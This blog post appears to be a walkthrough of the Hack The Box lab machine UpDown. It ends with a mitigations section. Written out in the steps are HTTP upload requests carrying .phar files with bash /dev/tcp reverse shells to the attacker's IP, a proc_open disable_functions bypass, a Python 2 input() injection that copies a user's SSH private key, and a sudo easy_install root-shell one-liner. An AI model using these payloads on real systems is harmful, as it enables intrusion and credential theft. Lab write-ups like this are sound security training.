---
layout: post
title: Hack The Box Walkthrough - UpDown
date: 2023-01-07
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/01/HTB/UpDown
img: 2023/01/UpDown/UpDown.png
---

It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy.

* Room: UpDown
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/UpDown](https://app.hackthebox.com/machines/UpDown)
* Author: [AB2](https://app.hackthebox.com/users/1303)

## Enumeration

As always, I started by running Rustscan to find open ports.

```bash
$ rustscan -a target -- -v | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.57.44:22
Open 10.129.57.44:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-17 07:30 EDT
Initiating Ping Scan at 07:30
Scanning 10.129.57.44 [2 ports]
Completed Ping Scan at 07:30, 0.05s elapsed (1 total hosts)
Initiating Connect Scan at 07:30
Scanning target (10.129.57.44) [2 ports]
Discovered open port 22/tcp on 10.129.57.44
Discovered open port 80/tcp on 10.129.57.44
Completed Connect Scan at 07:30, 0.03s elapsed (2 total ports)
Nmap scan report for target (10.129.57.44)
Host is up, received conn-refused (0.049s latency).
Scanned at 2022-09-17 07:30:11 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
```

Ports 22 (SSH) and 80 (HTTP) were open.

## Website

The website allowed checking if a website was up or not. 

![WebSite](/assets/images/2023/01/UpDown/UpDownSite.png "WebSite")

There was also a debug feature that showed the HTML returned by the site being checked.

![Debug On](/assets/images/2023/01/UpDown/SiteUpWithDebug.png "Debug On")

When I saw the debug feature, I thought I could use it to do [Server-Side Request Forgery (SSRF)](https://portswigger.net/web-security/ssrf). I tried to use it to check for ports that were only available on the server.

```bash
$ wfuzz -z range,1-65535 -d "site=http://localhost:FUZZ&debug=1" --hw 99  http://target.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://target.htb/
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000080:   200        85 L     209 W      2561 Ch     "80"

Total time: 0
Processed Requests: 65535
Filtered Requests: 65534
Requests/sec.: 0
```

It did not find anything. I launched Feroxbuster to look for hidden pages. 

```bash
$ feroxbuster -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php  -n -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c http://target.htb/.php
403      GET        9l       28w      275c http://target.htb/.html
200      GET       40l       93w     1131c http://target.htb/
403      GET        9l       28w      275c http://target.htb/.html.php
301      GET        9l       28w      306c http://target.htb/dev => http://target.htb/dev/
200      GET       40l       93w     1131c http://target.htb/index.php
403      GET        9l       28w      275c http://target.htb/.htaccess
403      GET        9l       28w      275c http://target.htb/.htaccess.php
403      GET        9l       28w      275c http://target.htb/.htm
403      GET        9l       28w      275c http://target.htb/.htm.php
403      GET        9l       28w      275c http://target.htb/.phtml
403      GET        9l       28w      275c http://target.htb/.htc
....
```

There was a dev folder, I scanned it also.

```bash
$ feroxbuster -u http://target.htb/dev/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php  -n -o feroxDev.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb/dev/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ feroxDev.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c http://target.htb/dev/.php
200      GET        0l        0w        0c http://target.htb/dev/
403      GET        9l       28w      275c http://target.htb/dev/.html
403      GET        9l       28w      275c http://target.htb/dev/.html.php
403      GET        9l       28w      275c http://target.htb/dev/.htaccess
403      GET        9l       28w      275c http://target.htb/dev/.htaccess.php
200      GET        0l        0w        0c http://target.htb/dev/index.php
403      GET        9l       28w      275c http://target.htb/dev/.phtml
403      GET        9l       28w      275c http://target.htb/dev/.htm
403      GET        9l       28w      275c http://target.htb/dev/.htm.php
403      GET        9l       28w      275c http://target.htb/dev/.htc
403      GET        9l       28w      275c http://target.htb/dev/.htc.php
403      GET        9l       28w      275c http://target.htb/dev/.html_var_DE
403      GET        9l       28w      275c http://target.htb/dev/.html_var_DE.php
403      GET        9l       28w      275c http://target.htb/dev/.htpasswd
403      GET        9l       28w      275c http://target.htb/dev/.htpasswd.php
301      GET        9l       28w      311c http://target.htb/dev/.git => http://target.htb/dev/.git/
403      GET        9l       28w      275c http://target.htb/dev/.html.
403      GET        9l       28w      275c http://target.htb/dev/.html..php
403      GET        9l       28w      275c http://target.htb/dev/.html.html
403      GET        9l       28w      275c http://target.htb/dev/.html.html.php
403      GET        9l       28w      275c http://target.htb/dev/.htpasswds
...
```

The dev folder contained a `.git` folder. So I used [git-dumper](https://github.com/arthaud/git-dumper) to extract it. 

```bash
$ git-dumper http://target.htb/dev/.git/ siteCode/
[-] Testing http://target.htb/dev/.git/HEAD [200]
[-] Testing http://target.htb/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://target.htb/dev/.gitignore [404]
[-] http://target.htb/dev/.gitignore responded with status code 404
[-] Fetching http://target.htb/dev/.git/ [200]
[-] Fetching http://target.htb/dev/.git/packed-refs [200]
[-] Fetching http://target.htb/dev/.git/description [200]
[-] Fetching http://target.htb/dev/.git/branches/ [200]
[-] Fetching http://target.htb/dev/.git/config [200]
[-] Fetching http://target.htb/dev/.git/HEAD [200]
[-] Fetching http://target.htb/dev/.git/index [200]
[-] Fetching http://target.htb/dev/.git/hooks/ [200]
[-] Fetching http://target.htb/dev/.git/info/ [200]
[-] Fetching http://target.htb/dev/.git/objects/ [200]
[-] Fetching http://target.htb/dev/.git/refs/ [200]
[-] Fetching http://target.htb/dev/.git/info/exclude [200]
[-] Fetching http://target.htb/dev/.git/objects/info/ [200]
[-] Fetching http://target.htb/dev/.git/refs/heads/ [200]
[-] Fetching http://target.htb/dev/.git/objects/pack/ [200]
[-] Fetching http://target.htb/dev/.git/refs/tags/ [200]
[-] Fetching http://target.htb/dev/.git/refs/remotes/ [200]
[-] Fetching http://target.htb/dev/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/commit-msg.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/post-update.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/pre-commit.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/pre-push.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/pre-receive.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://target.htb/dev/.git/hooks/update.sample [200]
[-] Fetching http://target.htb/dev/.git/refs/heads/main [200]
[-] Fetching http://target.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200]
[-] Fetching http://target.htb/dev/.git/refs/remotes/origin/ [200]
[-] Fetching http://target.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]
[-] Fetching http://target.htb/dev/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://target.htb/dev/.git/logs/ [200]
[-] Fetching http://target.htb/dev/.git/logs/HEAD [200]
[-] Fetching http://target.htb/dev/.git/logs/refs/ [200]
[-] Fetching http://target.htb/dev/.git/logs/refs/heads/ [200]
[-] Fetching http://target.htb/dev/.git/logs/refs/remotes/ [200]
[-] Fetching http://target.htb/dev/.git/logs/refs/heads/main [200]
[-] Fetching http://target.htb/dev/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://target.htb/dev/.git/logs/refs/remotes/origin/HEAD [200]
[-] Running git checkout .
Updated 6 paths from the index
```

This hinted at a possible development site. It did not appear to be in `/dev` so I looked for subdomains.

```bash
$ wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -t30 --hw 93 -H "Host:FUZZ.siteisup.htb" "http://siteisup.htb/"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://siteisup.htb/
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:   403        9 L      28 W       281 Ch      "dev"
000002700:   400        10 L     35 W       301 Ch      "m."
000002795:   400        10 L     35 W       301 Ch      "ns2.cl.bellsouth.net."
000002885:   400        10 L     35 W       301 Ch      "ns2.viviotech.net."
000002883:   400        10 L     35 W       301 Ch      "ns1.viviotech.net."
000003050:   400        10 L     35 W       301 Ch      "ns3.cl.bellsouth.net."
000004083:   400        10 L     35 W       301 Ch      "quatro.oweb.com."
000004082:   400        10 L     35 W       301 Ch      "jordan.fortwayne.com."
000004081:   400        10 L     35 W       301 Ch      "ferrari.fortwayne.com."

Total time: 6.349830
Processed Requests: 5000
Filtered Requests: 4991
Requests/sec.: 787.4226
```

It found `dev.siteisup.htb`, I added that to my hosts files. When I tried to visit it, I got a 403.

I looked at the .htaccess from the source code and saw that the site required a header to be present.

```
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

I used Burp Proxy Map and Replace to always had that header to my requests.

![Burp Add Header](/assets/images/2023/01/UpDown/BurpAddHeader.png "Burp Add Header")

I reloaded the page, and this time I got a 200.

![Dev Site](/assets/images/2023/01/UpDown/DevSite.png "Dev Site")

This site was also checking if websites were online or not. But this one allowed uploading files with a list of sites to check.

There was also an admin panel. 

![Admin Panel](/assets/images/2023/01/UpDown/AdminPanel.png "Admin Panel")

The panel was empty, but the `?page=admin` in the URL hinted at [Local File Inclusion (LFI)](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/). 

The source code confirmed it was possible.

```php
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>
```

There were some limitations, but I could include PHP files.

I thought that I might be able to use the file upload functionality to upload a PHP file, then execute it with LFI vulnerability. But it was not that simple. The upload had some restrictions on the file extensions, PHP files were rejected. And it was deleting the uploaded files as soon as it was done.

```php
if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	
  # Delete the uploaded file.
	@unlink($final_path);
}
```

It was also uploading files to a different folder every time. Luckily, directory listing was not disabled on the uploads folder, so I did not need to guess the folders where my files were being uploaded. I also did not need to use the LFI to execute PHP code if I were to find a way to upload a PHP file.

The deleting of the file could have been an issue, but I quickly found a way around that.

```php
function isitup($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, trim($url));
	curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$f = curl_exec($ch);
	$header = curl_getinfo($ch);
	if($f AND $header['http_code'] == 200){
		return array(true,$f);
	}else{
		return false;
	}
    curl_close($ch);
}
```

The code was using Curl to check if the websites were up. And it had a 30 seconds timeout. Hack The Box machines do not have access to the internet, so if I tried to check on any sites, it would hang for 30 seconds before deleting the file. I could add more lines if I needed more time.

```http
POST / HTTP/1.1
Host: dev.siteisup.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------27067171744469957932680288557
Content-Length: 387
Origin: http://dev.siteisup.htb
Connection: close
Referer: http://dev.siteisup.htb/
Upgrade-Insecure-Requests: 1
Special-Dev: only4dev

-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

https://app.hackthebox.com
https://app.hackthebox.com
-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="check"

Check
-----------------------------27067171744469957932680288557--
```

![Persisted File](/assets/images/2023/01/UpDown/PersitedFile.png "Persited File")

The code was blocking PHP files. But PHP [supports many extensions](https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology). I found out I could upload `.phar` files and they were executed. 

```http
POST / HTTP/1.1
Host: dev.siteisup.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------27067171744469957932680288557
Content-Length: 384
Origin: http://dev.siteisup.htb
Connection: close
Referer: http://dev.siteisup.htb/
Upgrade-Insecure-Requests: 1
Special-Dev: only4dev

-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="file"; filename="test.phar"
Content-Type: text/plain

<?php
echo 'RCE<br />';
?>
https://app.hackthebox.com
-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="check"

Check
-----------------------------27067171744469957932680288557--
```

![RCE](/assets/images/2023/01/UpDown/RCE.png "RCE")

At this point, I thought I had an easy reverse shell.

```http
POST / HTTP/1.1
Host: dev.siteisup.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------27067171744469957932680288557
Content-Length: 428
Origin: http://dev.siteisup.htb
Connection: close
Referer: http://dev.siteisup.htb/
Upgrade-Insecure-Requests: 1
Special-Dev: only4dev

-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="file"; filename="test.phar"
Content-Type: text/plain

<?php
`bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'`;
?>

https://app.hackthebox.com
-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="check"

Check
-----------------------------27067171744469957932680288557--
```

I sent a phar file with the reverse shell and opened it, but it failed. I tried different reverse shells, they all failed.

I changed my code to execute `phpinfo()`. This showed me why my reverse shells were all failing.

![Disabled Functions](/assets/images/2023/01/UpDown/DisabledFunctions.png "Disabled Functions")

The functions I was using to get the shell were all disabled by PHP configuration. I tried to use `ini_set` to enable them. But they cannot be enabled at runtime.

I tried other things, I used PHP to list the files and folders on the machine. I tried reading many files but did not find anything. I tried reading the user's ssh key but did not have access. I got stuck at this point. I left the machine aside and worked on others for a while. 


## Finally a Shell

When I came back to this box, I tried to bypass the disabled functions again. I tried a few things I found, but none of them worked. 

I came across a [Python script](https://github.com/teambi0s/dfunc-bypasser) that took the output of `phpinfo()` and checked for functions that are not disabled and can be exploited. The code failed to parse the list of functions. It's 3 years old and the format might have changed. I hardcoded the list of functions directly in the code and ran it.

```bash
$ python2 dfunc-bypasser.py --url http://dev.siteisup.htb/uploads/test.php


                                ,---,     
                                  .'  .' `\   
                                  ,---.'     \  
                                  |   |  .`\  | 
                                  :   : |  '  | 
                                  |   ' '  ;  : 
                                  '   | ;  .  | 
                                  |   | :  |  ' 
                                  '   : | /  ;  
                                  |   | '` ,/   
                                  ;   :  .'     
                                  |   ,.'       
                                  '---'         


                        authors: __c3rb3ru5__, $_SpyD3r_$


Please add the following functions in your disable_functions option: 
proc_open
If PHP-FPM is there stream_socket_sendto,stream_socket_client,fsockopen can also be used to be exploit by poisoning the request to the unix socket
```

`proc_open` was not disabled. I found a [small script](https://github.com/Taintedtrickstr/Reverse_Shells/blob/main/PHP_Proc_Open_Reverse_Shell) that showed how to exploit it to run commands on the server. 


I used it to get a shell on the server. 

```http
POST / HTTP/1.1
Host: dev.siteisup.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------27067171744469957932680288557
Content-Length: 1006
Origin: http://dev.siteisup.htb
Connection: close
Referer: http://dev.siteisup.htb/
Upgrade-Insecure-Requests: 1
Special-Dev: only4dev

-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="file"; filename="test.phar"
Content-Type: text/plain

<?php
$descriptorspec = array(
   0=> array("pipe", "r"),  // stdin is a pipe that the child will read from
   1=> array("pipe", "w"),  // stdout is a pipe that the child will write to
   2=> array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);
$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);
if (is_resource($process)) {
    fwrite($pipes[0], "bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'");
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $return_value = proc_close($process);

     echo "command returned $return_value\n";
}
?>

https://app.hackthebox.com
-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="check"

Check
-----------------------------27067171744469957932680288557--
```

I was finally in.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.177] 49620
bash: cannot set terminal process group (910): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c$ 

www-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c$ 
```

## Getting User

Once I got in the machine, I looked for files with the `suid` bit set.

```bash
www-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c$ find / -perm /u=s 2>/dev/null
<fc8e95da41b7b3fc5d0c$ find / -perm /u=s 2>/dev/null                   
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/home/developer/dev/siteisup
```

There was an executable in developer's home that I could run as them.

```bash
www-data@updown:/home/developer$ ls -la /home/developer/dev/siteisup
-rwsr-x--- 1 developer www-data 16928 Jun 22  2022 /home/developer/dev/siteisup

www-data@updown:/home/developer$ file /home/developer/dev/siteisup
/home/developer/dev/siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not s
tripped
www-data@updown:/home/developer$ strings /home/developer/dev/siteisup
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
setresgid
setresuid
system
getegid
geteuid
...
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
...

-rwxr-x--- 1 developer www-data 154 Jun 22  2022 /home/developer/dev/siteisup_test.py
www-data@updown:/home/developer$ cat /home/developer/dev/siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"

www-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c$ python --version
</3b8f7dcbcb24fc8e95da41b7b3fc5d0c$ python --version                   
Python 2.7.18
```

The executable seemed to be using a python script to check if a site was up. The script was using `input` to get the URL to check. Python 2 has a [known vulnerability](https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/) in input. I used it to copy developer's ssh key where I could read it.

```bash
www-data@updown:/home/developer/dev$ ./siteisup                                                                      
Welcome to 'siteisup.htb' application                                                                                
                                                                                                                     
Enter URL here:open('/tmp/key', 'w').write(open('/home/developer/.ssh/id_rsa').read())
Traceback (most recent call last):                                                                                   
  File "/home/developer/dev/siteisup_test.py", line 4, in <module>    
    page = requests.get(url)                                                                                         
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 515, in request
    prep = self.prepare_request(req)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 453, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 318, in prepare
    self.prepare_url(url, params)
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 392, in prepare_url
    raise MissingSchema(error)
requests.exceptions.MissingSchema: Invalid URL 'None': No scheme supplied. Perhaps you meant http://None?
www-data@updown:/home/developer/dev$ ls /tmp/
error-output.txt  key
www-data@updown:/home/developer/dev$ cat /tmp/key 
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
www-data@updown:/home/developer/dev$ 
```

I copied the key to my machine and used it to reconnect to the server.

```bash
$ vim dev_id_rsa

$ chmod 600 dev_id_rsa

$ ssh -i dev_id_rsa developer@target
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan  7 19:21:30 UTC 2023

  System load:           0.0
  Usage of /:            50.0% of 2.84GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             221
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.177
  IPv6 address for eth0: dead:beef::250:56ff:feb9:241

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 30 11:24:44 2022 from 10.10.14.36

developer@updown:~$ cat user.txt
REDACTED
```


## Getting root

Escalating to root was very easy. I checked if I could run anything with `sudo`. 

```bash
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install

developer@updown:~$ ls -l /usr/local/bin/easy_install
-rwxr-xr-x 1 root root 229 Aug  1 18:07 /usr/local/bin/easy_install

developer@updown:~$ file /usr/local/bin/easy_install
/usr/local/bin/easy_install: Python script, ASCII text executable

developer@updown:~$ cat /usr/local/bin/easy_install
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from setuptools.command.easy_install import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

I searched for exploits in [easy_install](https://packaging.python.org/en/latest/key_projects/#easy-install) and found one on [GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/) that created a fake local package with code executed on installation.

```bash
developer@updown:~$ TF=$(mktemp -d)

developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py

developer@updown:~$ sudo /usr/local/bin/easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.YeeqjgELbW
Writing /tmp/tmp.YeeqjgELbW/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.YeeqjgELbW/egg-dist-tmp-7F9vet

# whoami
root

# cat /root/root.txt
REDACTED
```

## Mitigations

I found the initial foothold on that box very hard. There were some security measures in place to make it harder to pwn. But it still had some issues that could be easily fixed. 

The `.git` folder should never be deployed with a site. Having access to the source code helped me find things I could exploit.

The file upload functionality had a few issues. 
* The upload folder should not allow directory listing
* Uploaded files should be renamed
* The upload folder should have been outside the webroot
* The list of extensions should have been an allowed list instead of a denied list

The disabled functions were great. This is what gave me a really hard time on that box. But it took only one missing function to allow access to the box. It shows that file upload is a very dangerous feature.

The issue with the Python script can be fixed by using `raw_input` instead of `input`. And the executable should probably not have the `suid` bit set.

As for `easy_install`, it is deprecated. So it should probably not be used. And it should not be run as root. Developers should install their dependencies as themselves.